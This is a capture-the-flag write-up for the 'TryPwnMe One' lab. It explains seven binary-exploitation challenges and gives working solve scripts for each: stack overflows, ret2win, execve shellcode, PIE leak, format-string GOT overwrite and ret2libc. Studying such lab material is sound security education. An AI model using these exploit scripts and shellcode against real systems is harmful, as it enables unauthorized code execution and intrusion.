# TryPwnMe One — Full Write-up


# 1. TryOverFlowMe1

**Flag: `THM{Oooooooooooooovvvvverrrflloowwwwww}`**

## The vulnerability

The decompiled `main` is:

```c
int main(){
    setup();
    banner();
    int admin = 0;          // [rbp-0x4]
    char buf[0x10];         // source says 16 bytes...

    puts("Please go ahead and leave a comment :");
    gets(buf);              // <-- unbounded read, no bounds check

    if (admin){
        // open "flag.txt" and print it
    } else {
        puts("Bye bye");
        exit(1);
    }
}
```

Two bugs combine:

1. **`gets()`** reads an unbounded line into a fixed stack buffer — a textbook
   stack overflow, and there is no stack canary to catch it.
2. A nearby local variable `admin` gates the flag-printing branch. We don't need
   to hijack control flow at all; we only need to make `admin` non-zero.

## Finding the offset

The *source* declares `char buf[0x10]`, but you can never trust the source
array size for padding — the compiler lays out and pads the frame itself. The
disassembly shows the real layout:

```asm
lea rax,[rbp-0x30]      ; buf actually starts at rbp-0x30
...
cmp DWORD PTR [rbp-0x4],0x0   ; admin is at rbp-0x4
```

So the distance from the start of the buffer to `admin` is:

```
0x30 - 0x4 = 0x2c = 44 bytes
```

## Exploitation

Write 44 bytes of padding, then any 4 non-zero bytes to overwrite `admin`. The
`if (admin)` branch then opens and prints `flag.txt`.

```bash
python3 -c 'import sys;sys.stdout.buffer.write(b"A"*44+b"WIN!\n")' | ./overflowme1
```

### solve.py

```python
#!/usr/bin/env python3
# TryPwnMe One - TryOverFlowMe1
# Bug: gets() into buf @ rbp-0x30 (no canary); local "admin" int @ rbp-0x4
#      starts 0. If admin != 0, main prints flag.txt. Overflow 44 bytes
#      (0x30-0x4) then write any non-zero value to flip admin.
#   Local : python3 solve.py
#   Remote: python3 solve.py <host> <port>
import sys, socket, subprocess, time

payload = b'A' * (0x30 - 0x4) + b'WIN!' + b'\n'

if len(sys.argv) == 3:                       # remote
    s = socket.create_connection((sys.argv[1], int(sys.argv[2])), timeout=10)
    s.settimeout(6)
    time.sleep(0.5)
    s.sendall(payload)                       # server echoes banner then reads
    data = b''
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            data += c
    except socket.timeout:
        pass
    sys.stdout.buffer.write(data)
    s.close()
else:                                         # local
    out = subprocess.run(['./overflowme1'], input=payload,
                         stdout=subprocess.PIPE, stderr=subprocess.DEVNULL).stdout
    sys.stdout.buffer.write(out)
```

---

# 2. TryOverFlowMe2

**Flag: `THM{why_just_the_A_have_all_theFun?}`**

## The vulnerability

Same class as challenge 1, but the check is tighter. From the disassembly:

```asm
sub rsp,0x50
mov DWORD PTR [rbp-0x4],0x0      ; check = 0
mov DWORD PTR [rbp-0x8],0x1      ; filler
mov DWORD PTR [rbp-0xc],0x0      ; filler
...
lea rax,[rbp-0x50]               ; buf @ rbp-0x50
call gets                        ; unbounded overflow
cmp DWORD PTR [rbp-0x4],0x59595959   ; must equal "YYYY"
jne  bye_bye
call read_flag                   ; prints flag.txt
```

Again `gets()` overflows the buffer, but this time the guard variable must equal
a **specific magic value** `0x59595959`, not merely be non-zero. `0x59` is the
ASCII code for `'Y'`, so the four overflow bytes must be exactly `YYYY`. The
flag name itself winks at this: spamming `A`s isn't enough.

## Finding the offset

```
buf   @ rbp-0x50
check @ rbp-0x4
offset = 0x50 - 0x4 = 0x4c = 76 bytes
```

## Exploitation

76 bytes of padding, then the literal bytes `YYYY` (= `0x59595959`). Because all
four bytes are identical, endianness is irrelevant. Hitting the magic value
makes `main` call `read_flag()`.

### solve.py

```python
#!/usr/bin/env python3
# TryPwnMe One - TryOverFlowMe2
# Bug: gets() into buf @ rbp-0x50 (no canary). Local "check" int @ rbp-0x4
#      must equal 0x59595959 ("YYYY") for main to call read_flag() -> flag.txt.
# Offset = 0x50 - 0x4 = 76, then the magic bytes "YYYY".
#   Local : python3 solve.py
#   Remote: python3 solve.py <host> <port>
import sys, socket, subprocess, time

payload = b'A' * (0x50 - 0x4) + b'YYYY' + b'\n'   # 76 pad + 0x59595959

if len(sys.argv) == 3:
    s = socket.create_connection((sys.argv[1], int(sys.argv[2])), timeout=10)
    s.settimeout(6); time.sleep(0.5)
    s.sendall(payload)
    data = b''
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            data += c
    except socket.timeout:
        pass
    sys.stdout.buffer.write(data); s.close()
else:
    out = subprocess.run(['./overflowme2'], input=payload,
                         stdout=subprocess.PIPE, stderr=subprocess.DEVNULL).stdout
    sys.stdout.buffer.write(out)
```

> **Note on ports:** each challenge runs on its own port. The overflowme2 payload
> also happens to satisfy overflowme1 (76 `A`s make its `admin` non-zero), so
> confirm you are on the correct service — overflowme2's banner is green
> (`\e[0;32m`), overflowme1's is blue (`\e[0;34m`).

---

# 3. TryRetMe

**Flag: `THM{a_r3t_to_w1n_by_thm}`**

## The vulnerability

The first real control-flow hijack. `vuln()` overflows a stack buffer:

```asm
sub  rsp,0x100
lea  rax,[rbp-0x100]     ; buf
mov  edx,0x200           ; length 0x200...
mov  rsi,rax
mov  edi,0x0
call read                ; read(0, buf, 0x200) -> 512 bytes into a 256 buffer
leave
ret                       ; <-- we control this return address
```

`read()` is told to accept `0x200` (512) bytes into a `0x100` (256) buffer, so
we overflow well past the saved return address. There is a `win()` function that
simply runs a shell:

```asm
win:
    lea rdi,[rip+...]    ; "/bin/sh"
    call system          ; system("/bin/sh")
```

## Finding the offset

```
buf @ rbp-0x100
saved RBP @ rbp
saved RIP @ rbp+8
offset to RIP = 0x100 + 8 = 264 bytes
```

## Exploitation — and the alignment gotcha

The naive payload `b'A'*264 + p64(win)` **segfaults**. Modern glibc's `system()`
executes an SSE instruction (`movaps`) that faults unless `rsp` is 16-byte
aligned at the moment of the call. When we return straight into `win`, the stack
is misaligned by 8.

The fix is a one-instruction detour: return first into a bare **`ret` gadget**
(here `0x401236`), which pops 8 bytes and realigns the stack, and *then* into
`win`:

```
payload = b'A'*264 + p64(ret_gadget) + p64(win)
```

`win()` runs `system("/bin/sh")`, giving an interactive shell; we send
`cat flag.txt` over it. (The flag lives at `/app/flag.txt` on the remote.)

### solve.py

```python
#!/usr/bin/env python3
# TryPwnMe One - TryRetMe  (ret2win)
# vuln(): read() up to 0x200 bytes into buf @ rbp-0x100 -> overflow, no canary.
# win(): system("/bin/sh"). Offset to saved RIP = 0x100 + 8 = 264.
# system() needs 16-byte stack alignment, so prepend a bare `ret` gadget.
#   Local : python3 solve.py
#   Remote: python3 solve.py <host> <port>
import sys, socket, subprocess, struct, time
p64 = lambda x: struct.pack('<Q', x)

WIN = 0x4011dd
RET = 0x401236                       # alignment gadget (a plain `ret`)
payload = b'A'*264 + p64(RET) + p64(WIN)
cmd     = b'cat flag.txt\n'

if len(sys.argv) == 3:
    s = socket.create_connection((sys.argv[1], int(sys.argv[2])), timeout=10)
    s.settimeout(5); time.sleep(0.5)
    s.sendall(payload); time.sleep(0.5)   # trips vuln() -> win() -> /bin/sh
    s.sendall(cmd)                         # runs inside the shell
    data = b''
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            data += c
    except socket.timeout:
        pass
    sys.stdout.buffer.write(data); s.close()
else:
    p = subprocess.Popen(['./tryretme'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    p.stdin.write(payload); p.stdin.flush(); time.sleep(0.3)
    p.stdin.write(cmd); p.stdin.flush(); p.stdin.close()
    sys.stdout.buffer.write(p.stdout.read())
```

---

# 4. TryExecMe

**Flag: `THM{Tr1Execm3_with_s0m3_sh3llc0de_w00t}`**

## The vulnerability

This is the only binary with **NX disabled** — the stack is executable. And the
program could not make it easier for us:

```asm
sub rsp,0x400
lea rax,[rbp-0x400]      ; buf
mov edx,0x400
mov rsi,rax
mov edi,0x0
call read               ; read(0, buf, 0x400)
...
lea rdx,[rbp-0x400]      ; rdx = buf
mov eax,0x0
call rdx                 ; <-- CALL our buffer directly!
```

`main` reads up to `0x400` bytes into a stack buffer and then does
**`call rdx`**, where `rdx` points at that very buffer. The program literally
executes our input as machine code. There is no overflow, no offset, no
return-address overwrite to compute.

## Exploitation

Because the stack is executable and control jumps straight to the start of our
buffer, we just send raw shellcode. A self-contained 26-byte
`execve("/bin/sh", NULL, NULL)` payload does the job. Conveniently, `rax` is
already `0` on entry (from `mov eax,0x0` right before the call), but the
shellcode sets everything it needs anyway:

```asm
xor  rsi, rsi            ; envp / argv = NULL
push rsi                 ; NULL terminator on stack
mov  rdi, "/bin//sh"     ; the "//" keeps it 8 bytes, harmless to execve
push rdi
mov  rdi, rsp            ; rdi -> "/bin//sh"
xor  rdx, rdx            ; envp = NULL
push 0x3b ; pop rax      ; rax = 59 = SYS_execve
syscall
```

### solve.py

```python
#!/usr/bin/env python3
# TryPwnMe One - TryExecMe  (shellcode injection; NX disabled)
# main(): read(0, buf, 0x400) then `call rdx` with rdx = buf  -> executes our
# input directly. Just send execve("/bin/sh") shellcode (rax is already 0).
#   Local : python3 solve.py
#   Remote: python3 solve.py <host> <port>
import sys, socket, subprocess, time

sc  = b"\x48\x31\xf6"                                  # xor rsi, rsi
sc += b"\x56"                                          # push rsi  (argv/env NULL)
sc += b"\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"      # mov rdi, "/bin//sh"
sc += b"\x57"                                          # push rdi
sc += b"\x48\x89\xe7"                                  # mov rdi, rsp
sc += b"\x48\x31\xd2"                                  # xor rdx, rdx
sc += b"\x6a\x3b\x58"                                  # push 0x3b ; pop rax (execve)
sc += b"\x0f\x05"                                      # syscall
cmd = b'cat flag.txt\n'

if len(sys.argv) == 3:
    s = socket.create_connection((sys.argv[1], int(sys.argv[2])), timeout=10)
    s.settimeout(5); time.sleep(0.5)
    s.sendall(sc); time.sleep(0.5)
    s.sendall(cmd)
    data=b''
    try:
        while True:
            c=s.recv(4096)
            if not c: break
            data+=c
    except socket.timeout: pass
    sys.stdout.buffer.write(data); s.close()
else:
    p=subprocess.Popen(['./tryexecme'],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
    p.stdin.write(sc); p.stdin.flush(); time.sleep(0.3)
    p.stdin.write(cmd); p.stdin.flush(); p.stdin.close()
    sys.stdout.buffer.write(p.stdout.read())
```

---



# 5. RandomMemories

**Flag: `THM{Th1s_R4ndom_acc3ss_m3mories_tututut_byp4ssed}`**

## The vulnerability

This binary is **PIE + full RELRO + NX** — every address is randomized at load
time, so the fixed-address ret2win of challenge 3 cannot work directly. We need
to know where the code is first.

The challenge *gives us the leak* inside `vuln()`:

```asm
lea rsi,[rip-0x16]       ; rsi = &vuln (the runtime address of vuln itself)
lea rdi,[rip+0xeaa]      ; "I can give you a secret %llx\n"
call printf              ; prints a live, ASLR'd address of vuln()
...
lea rax,[rbp-0x100]
mov edx,0x200
call read                ; read(0, buf, 0x200) -> overflow, same as TryRetMe
leave
ret
```

So `printf` discloses the runtime address of `vuln()`. Since the *offset* of
`vuln` within the module is known from the binary (`0x1319`), one leak collapses
PIE entirely:

```
PIE base = leaked_vuln_address - 0x1319
```

`win()` (offset `0x1210`) again calls `system("/bin/sh")`.

## Exploitation

1. **Leak:** read the `"I can give you a secret <hex>"` line and parse the hex.
2. **Rebase:** `base = leak - 0x1319`, then `win = base + 0x1210` and a `ret`
   alignment gadget at `base + 0x1226`.
3. **Overflow:** offset is again `0x100 + 8 = 264`. Return through the `ret`
   gadget (alignment, as in TryRetMe) into `win`.
4. Pop the shell and `cat flag.txt`.

### solve.py

```python
#!/usr/bin/env python3
# TryPwnMe One - RandomMemories  (PIE + full RELRO -> leak then ret2win)
# vuln() does printf("...secret %llx\n", &vuln) -> leaks a runtime vuln addr,
# then read(0, buf, 0x200) into buf @ rbp-0x100 (overflow, offset 264, no canary).
# win() = system("/bin/sh"). Defeat PIE with the leak; realign with a `ret`.
#   Local : python3 solve.py
#   Remote: python3 solve.py <host> <port>
import sys, socket, subprocess, struct, time, re
p64 = lambda x: struct.pack('<Q', x)

VULN_OFF = 0x1319
WIN_OFF  = 0x1210
RET_OFF  = 0x1226            # a lone `ret`, for system() 16-byte alignment
OFFSET   = 0x100 + 8         # 264

def parse_leak(b):
    m = re.search(rb'secret ([0-9a-fA-F]+)', b)
    return int(m.group(1), 16) if m else None

if len(sys.argv) == 3:
    s = socket.create_connection((sys.argv[1], int(sys.argv[2])), timeout=10)
    s.settimeout(5); time.sleep(0.5)
    pre = b''
    try:
        while b'going?' not in pre:
            c = s.recv(4096)
            if not c: break
            pre += c
    except socket.timeout:
        pass
    leak = parse_leak(pre); assert leak, "no leak:\n"+pre.decode(errors='replace')
    base = leak - VULN_OFF
    sys.stderr.write(f"[+] vuln leak = {leak:#x}  ->  PIE base = {base:#x}\n")
    payload = b'A'*OFFSET + p64(base+RET_OFF) + p64(base+WIN_OFF)
    s.sendall(payload); time.sleep(0.5)
    s.sendall(b'cat flag.txt\n')
    data=b''
    try:
        while True:
            c=s.recv(4096)
            if not c: break
            data+=c
    except socket.timeout: pass
    sys.stdout.buffer.write(data); s.close()
else:
    p=subprocess.Popen(['./random'],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
    pre=b''
    while b'going?' not in pre:
        pre += p.stdout.read(1)
    leak=parse_leak(pre); base=leak-VULN_OFF
    sys.stderr.write(f"[+] vuln leak = {leak:#x}  ->  PIE base = {base:#x}\n")
    payload=b'A'*OFFSET + p64(base+RET_OFF) + p64(base+WIN_OFF)
    p.stdin.write(payload); p.stdin.flush(); time.sleep(0.3)
    p.stdin.write(b'cat flag.txt\n'); p.stdin.flush(); p.stdin.close()
    sys.stdout.buffer.write(p.stdout.read())
```

A healthy run prints a base that ends in `000` (page-aligned), confirming the
leak math is correct, e.g. `PIE base = 0x55b70ef8b000`.

---

# 6. NotSpecified

**Flag: `THM{l3arn1ng_f0rm4t_str1ngs_awes0m3}`**

## The vulnerability

The name is the hint: the *format specifier is not specified*. `main` passes our
input straight to `printf` as the format string:

```asm
lea  rax,[rbp-0x100]
mov  edx,0x100
call read                ; read(0, buf, 0x100) -> exactly fills the buffer
...
lea  rax,[rbp-0x100]
mov  rdi,rax
call printf              ; printf(buf)  <-- FORMAT STRING BUG
...
call exit                ; main never returns normally
```

Note two things:

- `read` reads exactly `0x100` into a `0x100` buffer, so there is **no
  return-address overflow**, and `main` ends in `exit()` rather than `ret`.
  The only primitive we have is the **format string**.
- The binary is **non-PIE** with **partial RELRO**, which means the **GOT is
  writable**, and `exit()` is called *after* our `printf`.

There is a `win()` at `0x4011f6` that runs `system("/bin/sh")`.

## The plan — redirect `exit()` to `win()`

With a format string we can write arbitrary values to arbitrary addresses using
`%n`. The target is `exit`'s GOT entry; overwriting it with `win` means the
`exit()` call right after `printf` jumps into our shell instead.

The write is remarkably cheap here. With lazy binding (partial RELRO), `exit`'s
GOT entry still points at its **PLT stub** until first use:

```
exit@got  = 0x404048
exit@got currently holds the PLT stub 0x401106   (exit@plt + 6)
win       = 0x4011f6
```

`0x401106` and `0x4011f6` differ **only in the low two bytes** (`0x1106` vs
`0x11f6`). So a single two-byte `%hn` write of `0x11f6` (= 4598 decimal) turns
the stored stub address into `win`'s address — the upper bytes are already
correct.

## Finding the format offset

Sending `AAAAAAAA.%p.%p.%p...` shows our 8-byte marker (`0x4141414141414141`)
appearing at the **6th** conversion. So positional argument `%6$` references the
first 8 bytes of our buffer, `%7$` the next 8, `%8$` the next 8, etc.

We therefore lay the payload out so the **target address sits at offset 8**:

```
fmt = b'%4598c' + b'%8$hn'      # print 4598 chars, then %hn the 8th stack slot
fmt = fmt.ljust(16, b'A')       # pad to 16 bytes = two stack slots (offsets 6 & 7)
payload = fmt + p64(0x404048)   # exit@got lands at offset 8 -> hit by %8$hn
```

`%4598c` emits 4598 characters so that, by the time `%8$hn` fires, the running
output count is `0x11f6`; `%hn` writes that 16-bit value into `exit@got`. The
null bytes inside the packed address don't matter — `printf` fetches the pointer
from the stack as data, independent of where printing stops.

## Why no alignment gadget is needed

`exit@plt` reaches `win` via an indirect **`jmp`** (not a `call`), so no extra
return address is pushed. Entering `win` with the alignment already correct,
its own `push rbp` lines the stack up for `system()` — no `ret` detour required.

### solve.py

```python
#!/usr/bin/env python3
# TryPwnMe One - NotSpecified  (format string -> GOT overwrite)
# main(): printf(buf) with attacker-controlled format (no specifier), then exit().
# Non-PIE, partial RELRO (writable GOT). exit@got (0x404048) is lazy -> holds the
# PLT stub 0x401106. win=0x4011f6 differs only in low 2 bytes, so one %hn write of
# 0x11f6 (=4598) redirects exit() -> win() = system("/bin/sh"). Input is at stack
# offset 6; the target address is placed at offset 8 and hit with %8$hn.
#   Local : python3 solve.py
#   Remote: python3 solve.py <host> <port>
import sys, socket, subprocess, struct, time
p64=lambda x: struct.pack('<Q', x)

EXIT_GOT = 0x404048
WIN_LOW  = 0x4011f6 & 0xffff            # 0x11f6 = 4598
fmt = (b'%%%dc' % WIN_LOW) + b'%8$hn'
fmt = fmt.ljust(16, b'A')               # pad so address lands at stack offset 8
payload = fmt + p64(EXIT_GOT)

if len(sys.argv) == 3:
    s=socket.create_connection((sys.argv[1], int(sys.argv[2])), timeout=10)
    s.settimeout(5); time.sleep(0.5)
    s.sendall(payload); time.sleep(0.5)
    s.sendall(b'cat flag.txt\n')
    data=b''
    try:
        while True:
            c=s.recv(4096)
            if not c: break
            data+=c
    except socket.timeout: pass
    sys.stdout.buffer.write(data[-300:]); s.close()
else:
    p=subprocess.Popen(['./notspecified'],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
    p.stdin.write(payload); p.stdin.flush(); time.sleep(0.3)
    p.stdin.write(b'cat flag.txt\n'); p.stdin.flush(); p.stdin.close()
    sys.stdout.buffer.write(p.stdout.read()[-300:])
```
---

# 7. TheLibrarian

**Flag: `THM{YAY_You_r3t_t0_libc_well_d0n3}`**

## The vulnerability

The capstone. `vuln()` has the same overflow as before:

```asm
sub  rsp,0x100
lea  rax,[rbp-0x100]
mov  edx,0x200
call read                ; read(0, buf, 0x200) -> overflow, offset 264
leave
ret
```

The binary is **non-PIE** (fixed addresses) and NX is on, but there is **no
`win()` and no `system()`** inside it. To get a shell we must call `system()`
*inside libc* — a classic **ret2libc**. libc is ASLR'd, so we first need a leak;
and to call `system("/bin/sh")` we need to control `rdi`.

Two things make this tractable:

- The room **ships its exact `libc.so.6`** (Ubuntu glibc 2.27), so the internal
  offsets of `puts`, `system`, and the `"/bin/sh"` string are known precisely.
- The binary contains a convenient gadget inside the unused `help()` function:

  ```asm
  help:
      push rbp
      mov  rbp,rsp
      pop  rdi          ; 0x400639: pop rdi ; ret
      ret
  ```

  That's a ready-made **`pop rdi; ret`** at `0x400639` — exactly what we need to
  set the first argument.

Relevant fixed addresses in the binary:

```
pop rdi ; ret   = 0x400639
plain ret       = 0x40067c   (alignment gadget)
puts@plt        = 0x4004e0
puts@got        = 0x601018
main            = 0x40067d
offset to RIP   = 0x100 + 8 = 264
```

And from the provided glibc 2.27:

```
puts   offset = 0x80970
system offset = 0x4f420
/bin/sh       = 0x1b3d88
```

## Exploitation — two stages

**Stage 1 — leak libc.** Build a ROP chain that calls `puts(puts@got)`. The GOT
holds the *resolved* runtime address of `puts` in libc, so `puts` happily prints
its own libc address. Then we return into `main` so the program loops back and
gives us a *second* overflow:

```
'A'*264 + pop_rdi + puts@got + puts@plt + main
```

From the leaked value: `libc_base = leak - 0x80970`, then
`system = base + 0x4f420` and `binsh = base + 0x1b3d88`.

**Stage 2 — ret2libc.** With libc located, overflow again and call
`system("/bin/sh")`. As in TryRetMe, `system`'s `movaps` requires 16-byte stack
alignment, so we insert a plain `ret` before it:

```
'A'*264 + pop_rdi + binsh + ret + system
```

Then `cat flag.txt` over the shell.

### Testing locally

Because the remote uses the shipped glibc 2.27 (not your host's libc), run the
local test through the **provided loader** so the offsets match:

```bash
./ld-linux-x86-64.so.2 --library-path . ./thelibrarian
```

(The script does this automatically in local mode.)

### solve.py

```python
#!/usr/bin/env python3
# TryPwnMe One - TheLibrarian  (ret2libc with libc leak; non-PIE, NX)
# vuln(): read(0, buf, 0x200) into buf @ rbp-0x100 -> overflow, offset 264, no canary.
# No win/system in binary. Stage 1: puts(puts@got) to leak libc, return to main.
# Stage 2: system("/bin/sh"). Gadget `pop rdi; ret` @ 0x400639 (inside help()).
# libc = provided libc.so.6 (glibc 2.27 Ubuntu): puts=0x80970 system=0x4f420 binsh=0x1b3d88
#   Local : python3 solve.py           (runs with the shipped ld + libc)
#   Remote: python3 solve.py <host> <port>
import sys, socket, subprocess, struct, time
p64=lambda x: struct.pack('<Q', x)
u64=lambda b: struct.unpack('<Q', b.ljust(8,b'\x00'))[0]

POP_RDI  = 0x400639
RET      = 0x40067c
PUTS_PLT = 0x4004e0
PUTS_GOT = 0x601018
MAIN     = 0x40067d
OFFSET   = 0x100 + 8          # 264
PUTS_OFF, SYSTEM_OFF, BINSH_OFF = 0x80970, 0x4f420, 0x1b3d88

class Tube:
    def __init__(self, argv=None, host=None, port=None):
        if host:
            self.s=socket.create_connection((host,port),timeout=10); self.s.settimeout(6); self.p=None
        else:
            self.p=subprocess.Popen(argv,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.DEVNULL); self.s=None
    def send(self,d):
        if self.s: self.s.sendall(d)
        else: self.p.stdin.write(d); self.p.stdin.flush()
    def recv1(self):
        return self.s.recv(1) if self.s else self.p.stdout.read(1)
    def until(self,marker):
        buf=b''
        while marker not in buf:
            c = self.recv1()
            if not c: break
            buf+=c
        return buf
    def read_leak(self):
        # skip any leading newlines, then read 6 address bytes
        c=self.recv1()
        while c==b'\n': c=self.recv1()
        b=c
        while len(b)<6: b+=self.recv1()
        return b
    def drain(self):
        out=b''
        if self.s:
            try:
                while True:
                    c=self.s.recv(4096)
                    if not c: break
                    out+=c
            except socket.timeout: pass
        else:
            out=self.p.stdout.read()
        return out

if len(sys.argv)==3:
    t=Tube(host=sys.argv[1], port=int(sys.argv[2]))
else:
    t=Tube(argv=['./ld-linux-x86-64.so.2','--library-path','.','./thelibrarian'])

# --- Stage 1: leak puts@libc, return to main ---
t.until(b'Again? Where this time? :')
rop1 = b'A'*OFFSET + p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN)
t.send(rop1)
t.until(b"ok, let's go!\n")
leak = u64(t.read_leak())
base = leak - PUTS_OFF
sys.stderr.write(f"[+] puts@libc = {leak:#x}  ->  libc base = {base:#x}\n")
system = base + SYSTEM_OFF
binsh  = base + BINSH_OFF

# --- Stage 2: system("/bin/sh") ---
t.until(b'Again? Where this time? :')
rop2 = b'A'*OFFSET + p64(POP_RDI) + p64(binsh) + p64(RET) + p64(system)
t.send(rop2)
t.until(b"ok, let's go!\n")
time.sleep(0.4)
t.send(b'cat flag.txt; exit\n')
sys.stdout.buffer.write(t.drain()[-300:])
```
